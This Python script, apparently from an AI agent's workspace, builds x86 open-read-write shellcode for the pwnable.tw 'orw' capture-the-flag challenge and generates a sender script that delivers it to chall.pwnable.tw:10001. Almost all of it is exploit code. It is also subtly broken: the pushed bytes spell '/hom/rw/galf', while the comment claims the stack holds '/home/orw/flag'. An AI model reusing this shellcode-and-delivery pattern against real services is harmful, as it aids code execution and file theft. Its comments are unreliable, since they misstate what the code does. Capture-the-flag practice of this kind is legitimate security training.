#!/usr/bin/env python3

# Alternative approach - try a different shellcode pattern

def create_alternative_shellcode():
    # Try a different approach - maybe the issue is with the string construction
    shellcode = b""
    
    # Use push instructions to build the string
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x50"                  # push eax (null terminator)
    shellcode += b"\x68\x67\x61\x6c\x66"  # push "flag"
    shellcode += b"\x68\x2f\x72\x77\x2f"  # push "/orw/"
    shellcode += b"\x68\x2f\x68\x6f\x6d"  # push "/hom"
    
    # Now esp points to "/home/orw/flag\0"
    
    # open syscall
    shellcode += b"\x89\xe3"              # mov ebx, esp (filename)
    shellcode += b"\x31\xc9"              # xor ecx, ecx (O_RDONLY)
    shellcode += b"\x31\xd2"              # xor edx, edx (mode)
    shellcode += b"\xb0\x05"              # mov al, 5 (sys_open)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read syscall
    shellcode += b"\x89\xc3"              # mov ebx, eax (file descriptor)
    shellcode += b"\x89\xe1"              # mov ecx, esp (buffer)
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100 (read 100 bytes)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3 (sys_read)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write syscall
    shellcode += b"\x89\xc2"              # mov edx, eax (bytes read)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4 (sys_write)
    shellcode += b"\xb3\x01"              # mov bl, 1 (stdout)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax (sys_exit = 1)
    shellcode += b"\xcd\x80"              # int 0x80
    
    return shellcode

def main():
    shellcode = create_alternative_shellcode()
    print(f"Alternative shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Write to file
    with open('/workspace/orw_challenge/alternative.bin', 'wb') as f:
        f.write(shellcode)
    
    print("Alternative shellcode written to alternative.bin")
    
    # Create a script to send it
    with open('/workspace/orw_challenge/send_alternative.py', 'w') as f:
        f.write(f'''#!/usr/bin/env python3
import socket
import time

shellcode = bytes.fromhex("{shellcode.hex()}")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw", 10001))

data = s.recv(1024)
print(data.decode())

s.send(shellcode)

time.sleep(1)
response = s.recv(1024)
print(response.decode())

s.close()
''')
    
    print("Alternative script created")

if __name__ == "__main__":
    main()